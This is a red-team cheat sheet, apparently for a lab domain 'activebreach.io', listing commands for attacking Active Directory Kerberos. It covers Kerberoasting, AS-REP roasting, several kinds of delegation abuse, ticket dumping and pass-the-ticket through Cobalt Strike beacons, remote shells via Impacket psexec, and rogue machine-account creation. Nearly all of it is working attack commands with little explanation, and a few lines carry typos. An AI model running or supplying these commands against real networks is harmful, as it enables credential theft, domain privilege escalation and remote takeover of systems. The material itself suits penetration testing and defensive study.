# Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /domain:activebreach.io
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

# ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
execute-assembly C:\Users\Public\Rubeus.exe asreproast format:hashcat /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe asreproast /domain:activebreach.io
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```

### Unconstrained Delegation
```
PsExec64.exe -accepteula -s -i cmd.exe
Rubeus.exe monitor /interval:1 /nowrap

PsExec64.exe -accepteula -s -i cmd.exe
SpoolSample.exe DC Current Workstation which is configured with Unconstrained Delegation
SpoolSample.exe DC01.Activebreach.io John-activebreach.io
Rubues.exe ptt /ticket:base64Her
```
### From From Beacon (Cobalt Strike)
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\rubeus.exe triage
execute-assembly C:\Users\Public\rubeus.exe dump /luid:0x44e8a2a
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
### Constrained Delegation
**If computer account is delegated to Constrained Delegation, $ need to be added**
```
 $data = (Get-DomainComputer John-activebreach.io -Properties 'msdsallowedtoactonbehalfofotheridentity').'msdsallowedtoactonbehalfofotheridentity'; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $data, 0; $Descriptor.DiscretionaryAcl | ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier }


.\Rubeus.exe s4u /user:John-activebreach.io /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /dc:10.10.10.10 /ptt "misc::cmd" 
.\Rubeus.exe s4u /user:John-activebreach.io /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /dc:10.10.10.10 /ptt /outfile:Alice-Ticket.kirbi
.\Rubeus.exe s4u /user:John-activebreach.io$ /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:time/DC01.Activebreach.io /dc:10.10.10.10 /ptt /outfile:Alice-Ticket.kirbi
.\Rubeus.exe s4u /user:John-activebreach.io$ /domain:activebreach.io /rc4: /impersonateuser:administrator /msdsspn:host/DC01.Activebreach.io /dc:10.10.10.10 /ptt /outfile:Alice-Ticket.kirbi

```
### From Kali To gain Remote Shell 
```
impacket-ticketConverter cif_cifs_Alice-Ticket.kirbi Alice-Ticket.ccache
export KRB5CCNAME=aAlice-Ticket.ccache
proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
```
### From From Beacon (Cobalt Strike)
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt 
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John_PC$ /msdsspn:cifs/fs-1.insomnia.io /ticket:
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /altservice:cifs /ticket:
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
### Resource Based Constrained Delegation
**If computer account is delegated to Resource Based Constrained Delegation, $ need to be added**

```
Rubeus.exe s4u /user:John-activebreach.io$ /domain:activebreach.io /rc4:<> /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /ptt "misc::cmd" 
Rubeus.exe s4u /user:John-activebreach.io$ /domain:activebreach.io /rc4:<> /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /ptt /outfile:Alice-Ticket.kirbi
Rubeus.exe s4u /user:John-activebreach.io /domain:activebreach.io /rc4:<> /impersonateuser:administrator /msdsspn:cifs/DC01.Activebreach.io /ptt /dc:10.10.10.10 /outfile:Alice-Ticket.kirbi
dir \\DC01.Activebreach.io\c$
```
### From Kali To gain Remote Shell 
```
impacket-ticketConverter cif_cifs_Alice-Ticket.kirbi Alice-Ticket.ccache
export KRB5CCNAME=Alice-Ticket.ccache
proxychains impacket-psexec -k -no-pass -target-ip 10.10.10.110 -dc-ip 10.10.10.10 John-activebreach.io
```

### Adding Computer Account
```
Import-Module .\Powermad.psd1
New-MachineAccount -Domain activebreach.io -DomainController 10.10.10.10 -MachineAccount Alice -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
Set-ADComputer Alice.activebreach.io -PrincipalsAllowedToDelegateToAccount Alice$ -Verbose
Rubeus.exe s4u /user:Alice$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/Alice.activebreach.io /impersonateuser:Administrator /ptt
Enter-PSSession -ComputerName Alice.activebreach.io
```
